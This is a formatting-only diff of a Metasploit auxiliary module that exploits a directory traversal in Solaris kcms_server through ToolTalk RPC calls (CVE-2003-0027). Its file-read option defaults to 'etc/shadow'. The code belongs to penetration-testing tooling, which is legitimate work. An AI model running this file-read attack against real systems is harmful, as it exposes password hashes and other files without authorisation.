@@ -8,8 +8,8 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'Solaris KCMS + TTDB Arbitrary File Read',
-      'Description'    => %q{
+      'Name' => 'Solaris KCMS + TTDB Arbitrary File Read',
+      'Description' => %q{
           This module targets a directory traversal vulnerability in the
         kcms_server component from the Kodak Color Management System. By
         utilizing the ToolTalk Database Server\'s TT_ISBUILD procedure, an
@@ -20,19 +20,17 @@ class MetasploitModule < Msf::Auxiliary
         kcms_server and rpc.ttdbserverd must be running on the target
         host.
       },
-      'Author'         =>
-        [
-          'vlad902 <vlad902[at]gmail.com>', # MSF v2 module
-          'jduck'  # Ported to MSF v3
-        ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          ['CVE', '2003-0027'],
-          ['OSVDB', '8201'],
-          ['BID', '6665'],
-          ['URL', 'http://marc.info/?l=bugtraq&m=104326556329850&w=2']
-        ],
+      'Author' => [
+        'vlad902 <vlad902[at]gmail.com>', # MSF v2 module
+        'jduck' # Ported to MSF v3
+      ],
+      'License' => MSF_LICENSE,
+      'References' => [
+        ['CVE', '2003-0027'],
+        ['OSVDB', '8201'],
+        ['BID', '6665'],
+        ['URL', 'http://marc.info/?l=bugtraq&m=104326556329850&w=2']
+      ],
       # Tested OK against sol8.tor 20100624 -jjd
       'DisclosureDate' => 'Jan 22 2003')
 
@@ -40,11 +38,11 @@ class MetasploitModule < Msf::Auxiliary
       [
         OptString.new('PATH', [ true, "Path to the file to disclose, relative to the root dir.", 'etc/shadow']),
         OptString.new('OUTPUTPATH', [ false, "Local path to save the file contents to", nil ])
-      ])
+      ]
+    )
   end
 
   def run
-
     # There is a fixed size buffer in use, so make sure we don't exceed it..
     # (NOTE: 24 bytes are reserved for traversal string)
     path = datastore['PATH']
@@ -68,7 +66,8 @@ class MetasploitModule < Msf::Auxiliary
     buf = Rex::Encoder::XDR.encode(
       [trav, 1024],
       0, # O_RDONLY
-      0755) # mode
+      0755
+    ) # mode
 
     # Make the request
     ret = sunrpc_call(1003, buf)
@@ -90,7 +89,8 @@ class MetasploitModule < Msf::Auxiliary
     buf = Rex::Encoder::XDR.encode(
       fd,
       0,
-      fsize)
+      fsize
+    )
 
     ret = sunrpc_call(1005, buf)
     x, data = Rex::Encoder::XDR.decode!(ret, Integer, [Integer])
@@ -122,14 +122,12 @@ class MetasploitModule < Msf::Auxiliary
 
     # done
     sunrpc_destroy
-
   rescue Timeout::Error, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Rex::Proto::SunRPC::RPCError => e
     print_error(e.to_s)
   rescue ::Rex::Proto::SunRPC::RPCTimeout
     print_warning 'Warning: ' + $!
     print_warning 'Exploit may or may not have succeeded.'
   end
-
 
   #
   # Send a TT_ISBUILD request to rpc.ttdbserverd
@@ -149,7 +147,8 @@ class MetasploitModule < Msf::Auxiliary
       # 21 zeros, /KEYDESC, /KEY
       0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
       0x10002,
-      path.length)
+      path.length
+    )
     ret = sunrpc_call(3, msg)
     arr = Rex::Encoder::XDR.decode!(ret, Integer, Integer)
     print_status("TTDB reply: 0x%x, %d" % arr)
